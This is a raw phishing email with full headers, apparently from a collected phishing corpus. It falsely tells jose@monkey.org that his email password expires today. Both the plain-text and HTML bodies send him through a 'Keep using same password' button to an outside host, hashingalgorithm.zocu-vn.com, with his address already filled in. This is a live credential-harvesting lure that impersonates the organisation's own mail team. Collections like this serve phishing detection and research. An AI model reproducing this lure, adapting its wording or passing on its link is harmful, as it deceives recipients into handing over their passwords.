@@ -1,0 +1,190 @@
+Return-Path: ceo@al-mousa-sa.com
+Delivered-To: jose@monkey.org
+X-FDA: 83386942926.22.4FA919F
+Received: from mail.al-mousa-sa.com (mail.al-mousa-sa.com [185.253.117.104])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 31D251A0011
+	for <jose@monkey.org>; Tue, 29 Apr 2025 12:02:00 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;
+	dkim=pass header.d=al-mousa-sa.com header.s=default header.b=C+inBEfg;
+	spf=pass (imf02.b.hostedemail.com: domain of ceo@al-mousa-sa.com designates
+ 185.253.117.104 as permitted sender) smtp.mailfrom=ceo@al-mousa-sa.com;
+	dmarc=pass (policy=quarantine) header.from=al-mousa-sa.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1745928121;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=tHTSQkAhJ4IWEjCdk1qT5dxRpZS7xlKQC+4IiDPBB98=;
+	b=tffJlMvyv8WuDLFYm6AbDnXxB0suqQV86MJ9Q3f7G8nZnSFZtSnjXhGY/g5P3fL54MuUBL
+	R1jkEawIeQ9au5HQAjAn9i//zn9sajAxHMpXOP0p9b7wlEvIdrRJwpcSbUBWBCJ9Rj2Htf
+	8aixDJxr2HXRo3y1WRw4y72QrJ3bANw=
+ARC-Authentication-Results: i=1;
+	imf02.b.hostedemail.com;
+	dkim=pass header.d=al-mousa-sa.com header.s=default header.b=C+inBEfg;
+	spf=pass (imf02.b.hostedemail.com: domain of ceo@al-mousa-sa.com designates
+ 185.253.117.104 as permitted sender) smtp.mailfrom=ceo@al-mousa-sa.com;
+	dmarc=pass (policy=quarantine) header.from=al-mousa-sa.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1745928121; a=rsa-sha256;
+	cv=none;
+	b=7hKSrJSqczsVn24OJ6cpO8UggNYqz0P5GXXLK4lo09fgBs+hTopPbPzyy3PpAouBuksD82
+	Ua0jaHhySCz6ArJoa4vZHNVty6Zfqf8wu+jDqWlNI4jxB0Lp59om9azRVcT2CnMsXfNkwH
+	WYdM/xe//jp/mC+GDKsAVOa9gnx3vQ8=
+Received: from vultr-guest (unknown [45.32.30.160])
+	by mail.al-mousa-sa.com (Postfix) with ESMTPSA id 445878630D
+	for <jose@monkey.org>; Tue, 29 Apr 2025 12:01:45 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=al-mousa-sa.com;
+	s=default; t=1745928106;
+	bh=tHTSQkAhJ4IWEjCdk1qT5dxRpZS7xlKQC+4IiDPBB98=; h=From:Subject:To;
+	b=C+inBEfg+K/BfEwj8Spes0Bzq9g6qyC9IfaRX6F02AvMre5B08xjY1cbYHXAgszt0
+	 XYdjz9BkXH+r2gpodKAB74unT0FjN9Beyj6kUrEH8Qofj9IuyMcehfSL6A7UMDMr1W
+	 zpba6U6NGLTeAOGZNLlFN1nwfLAmxeCxvmo3SPWSUDglDp2ssC3LVLHtM0qkLIfpwU
+	 rG9D5gIbGvaW+y2iiT039uH7Lun7TVdjZF9WvFcetgVLfVn2dXwWDkR8eTKDKSt9SP
+	 pnN/g4HLHyIwDxH9UoUmy3VAQL8oJbvCCeyPkOYwgG3rHUsTKGFNMAOAc+Wi+QrduB
+	 mi5xlod7DeqFQ==
+Received-SPF: pass (mail.al-mousa-sa.com: connection is authenticated)
+From: "Monkey Notification" <ceo@al-mousa-sa.com>
+Subject: Ref: #539731334 Your Email account Password is expiring today
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="qypRt58DotSjDfKERymFtHqnJ4Zrgr=_3i"
+MIME-Version: 1.0
+Date: Tue, 29 Apr 2025 12:01:45 +0000
+Message-Id: <2025290412014454976A1376$954FE1BAAB@al-mousa-sa.com>
+X-PPP-Message-ID: 
+ <174592810618.17431.15646768229398573748@mail.al-mousa-sa.com>
+X-PPP-Vhost: al-mousa-sa.com
+X-Rspamd-Queue-Id: 31D251A0011
+X-Stat-Signature: 1x5n5e63gjot1umthjrjdrizwohjiic7
+X-Rspam-User: 
+X-Spam-Status: No, score=-0.70
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1745928120-879251
+X-HE-Meta: 
+ U2FsdGVkX1+XLQacHx0pwciD2VIxyK81aO6BXkC3ACaLod7TU3SuhE1Nbq8oYBAypD0196x+XQVgKfOtdmEhSBUCTB+O7enH7Y5MVwfn2yC4QFyrf72A5q87XhgawGG2wMVlQsWZlKv4ZZOP3kpdksK8DlhezTxCPXorhB5nPI1tFN7nZx83KsdRveY4EqhmV/rOGfCVRwJgN3M/rTPEAsdsXZDMB176puaZmhtTEPMmLqBM4DIP3u9438G6FsMmVXrm5iX1iMFtujZnAlnKkUtizeZy0IO8PPBsx0oV4OdrXxSsDewsJbZLNcBCzwqJoZiQlSACORemJjz1VY7OuRAs2rHmWBfrYkTnnLhilqaNxu75BEVAc+XAyzD79gIfqWJ/WrPWCLFOUj7V6zpmKCN28Ihvh+NYC8glZiSofZxZ3U1GWVkXFv7KsR5uxmL8M+kaTbVwVRGXa5U/CN8395uSm+IVLLKXR2zoXn1xzY4Zn4kCUJQ6EG3zu6qEpqb3yzTcaMyzdWD6PfKa7nvhnLAx1n7zn2Fk8aRLfwqer6H0s9p6vqiwfDc7hnvm7IKWjeO1mGdRZD4Oo36bUXY4m5rUNVFJKbnJA7IbL3bfXd3SGnvYzLc8Qfllp7XsdrXHxfk47FhHi3QJ5XhQKJ9dGrdFtA9JrZfHpflneEYdHS3PeOahhXJtjaMVlw7+Qp2IKINLlI1PKF8HcSkgCIYUtG3oCDoLofmBAnFxo5QvlvBpRXt9s0b2/uirkI4EKFkwZkOMiKELG+ntXj0/q+qmZKpWFJVcXyabaEGoWyH1F9klvkJ2veoEfYCP2LiHj8CxxUDzJcFZvfOSJcArPQSkBk/axzE4m3Ko2nwsYz0wiMbRd3Shp+zymPfkNyBDMRPJHZscYYZjfhrs4soiE6KIerHw3OIuT64SpQeZXoFTUGvN6AJD9b3QQEiC2F2SRtVxtnd6NiSpppI9xvx3n8+5QswzqCK
+ EfccD9j2c113Z5lcjKXmD/n4gAPU+Vp4EckpSc98O7XBzoMjpnrUSwWkFGRsKIy/S7s9sFq8YVVMKA+B6+PoN3OLT6U//LJERykLo2DQsiuei0H9x33HtTE9+FULR1vERRDXuzK2y9VPipn8/K0CkeVNXT2TiHr4FZ7eACfl+v4gtL7eyJiimX6gwng87lz1Hinsc5GcK5X856Its6P948HufyS11qLhRQwNLoZt6LYKQUt3LL+XrPrgmbuJC6zCDwqMhiGidMzfI2pD1cxcyznNKQq/hfsccqeUuNb1kTaEdjm+SsMSDbqgEc8x04F0tX/hxsjsyl4RUeltC2aapeTpNxSr19nCkRoj3yzGTHAgcQyk4/YoVCdktRoucx8MRqD+ySXqRzGEpu3YxfaQSRc28GbCVyFyDh1PIf9kUxS/6KhZLb5i/e3Jm0+MxQW0cDZ0cmuJB9xMaE05QNJg0skXr3tYRPLlE03YvaBmPxSIy475bFtYnpCMzKDqkfIjSc+NUQnaZbcCm2rgVpMGYnCyYEG0stidn1NqABtX33DDpBhDZYv1vNiDnoUs4C316Op9EhpPeh6NK6DKqHMHhw6jeCoYKP+g2a2Ya9gbMsepRGXYEMoPjkQ1TswINPNBxv5gKrzVH98A23FnILkQ58UGm/w==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 187
+
+This is a multi-part message in MIME format
+
+--qypRt58DotSjDfKERymFtHqnJ4Zrgr=_3i
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Hello jose, https://mail.hostinger.com/?_task=3Dmail&_caps=3Dpdf%3D1%2=
+Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=3D2000&_mbox=3DINB=
+OX&_framed=3D1&_action=3Dpreview#v1
+
+Your Email account Password is expiring today.
+
+As per the policy set by your organization: monkey.org.
+
+Click below to continue using the same password.
+
+Keep using same password https://hashingalgorithm.zocu-vn.com/?squphd1=
+vy2=3Djose@monkey.org
+
+Please contact monkey.org support if you have any questions.
+
+Greetings,
+
+monkey.org Team
+
+--qypRt58DotSjDfKERymFtHqnJ4Zrgr=_3i
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <title>Ref: #539731334 Your Email account Password is expiring today=
+</title>
+ </head>
+ <body><table style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-F=
+AMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BOR=
+DER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
+ rgb(44,54,58); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D=
+"100%" border=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D=
+"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; FONT-SI=
+ZE: 24px; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; PADDIN=
+G-BOTTOM: 0px; PADDING-TOP: 8px; PADDING-LEFT: 12px; LINE-HEIGHT: 48px=
+; PADDING-RIGHT: 0px"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT:=
+ bolder"><A style=3D"BOX-SIZING: border-box; CURSOR: default !importan=
+t; TEXT-DECORATION: none !important; COLOR: rgb(34,34,34) !important; =
+BACKGROUND-COLOR: transparent" href=3D"https://mail.hostinger.com/?_ta=
+sk=3Dmail&amp;_caps=3Dpdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpm=
+ime%3D0&amp;_uid=3D2000&amp;_mbox=3DINBOX&amp;_framed=3D1&amp;_action=3D=
+preview#v1"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inh=
+erit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">=
+Hello jose,</FONT></FONT></A></B></TD></TR> <TR style=3D"BOX-SIZING: b=
+order-box"> <TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; FONT=
+-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 12px; LINE-HEIGHT: 48px; PADDING-RIGH=
+T: 0px"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT=
+ style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=
+=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">Your Email accoun=
+t Password is expiring today.</FONT></FONT></B></TD></TR> <TR style=3D=
+"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; FONT-SI=
+ZE: 14px; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; PADDIN=
+G-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 12px; LINE-HEIGHT: 24p=
+x; PADDING-RIGHT: 0px"> <P><FONT style=3D"BOX-SIZING: border-box; VERT=
+ICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-A=
+LIGN: inherit">As per the policy set by your organization: </FONT></FO=
+NT>monkey.org<FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: in=
+herit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"=
+>.</FONT></FONT></p><p>Click below to continue using the same password=
+=2E</P></TD></TR> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"B=
+OX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING=
+-LEFT: 12px; PADDING-RIGHT: 0px"><A style=3D"BOX-SIZING: border-box; F=
+ONT-SIZE: 16px; TEXT-DECORATION: none; BORDER-TOP: rgb(51,158,114) 12p=
+x solid; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; BORDER-=
+RIGHT: rgb(51,158,114) 40px solid; BORDER-BOTTOM: rgb(51,158,114) 12px=
+ solid; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); BORDER-LEFT: rgb(51=
+,158,114) 40px solid; DISPLAY: inline-block; BACKGROUND-COLOR: rgb(51,=
+158,114)" href=3D"https://hashingalgorithm.zocu-vn.com/?squphd1vy2=3Dj=
+ose@monkey.org" rel=3Dnoreferrer target=3D_blank><FONT style=3D"BOX-SI=
+ZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: =
+border-box; VERTICAL-ALIGN: inherit">Keep using same password</FONT></=
+FONT></A></TD></TR> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D=
+"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Open Sans', 'T=
+rebuchet MS', sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADD=
+ING-LEFT: 12px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px"><FONT style=3D"=
+BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SI=
+ZING: border-box; VERTICAL-ALIGN: inherit">Please contact monkey.org</=
+FONT></FONT>&nbsp;<FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIG=
+N: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inh=
+erit"> support if you have any questions.</FONT></FONT></TD></TR> <TR =
+style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box;=
+ FONT-SIZE: 14px; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif=
+; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 12px; LINE-HEI=
+GHT: 24px; PADDING-RIGHT: 0px"><FONT style=3D"BOX-SIZING: border-box; =
+VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTIC=
+AL-ALIGN: inherit">Greetings,</FONT></FONT></TD></TR> <TR style=3D"BOX=
+-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; FONT-SIZE: =
+14px; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; PADDING-BO=
+TTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 12px; LINE-HEIGHT: 24px; PA=
+DDING-RIGHT: 0px"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bol=
+der"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><=
+FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">monkey.=
+org Team</FONT></FONT></B></TD></TR> <TR style=3D"BOX-SIZING: border-b=
+ox"> <TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY=
+: 'Open Sans', 'Trebuchet MS', sans-serif; PADDING-BOTTOM: 0px; PADDIN=
+G-TOP: 0px; PADDING-LEFT: 12px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px"=
+>&nbsp;</TD></tr><tr><td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1=
+4px; FONT-FAMILY: 'Open Sans', 'Trebuchet MS', sans-serif; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 12px; LINE-HEIGHT: 24px; PAD=
+DING-RIGHT: 0px">&nbsp;</TD></TR></TABLE></body>
+ </html>
+
+--qypRt58DotSjDfKERymFtHqnJ4Zrgr=_3i--
+
+
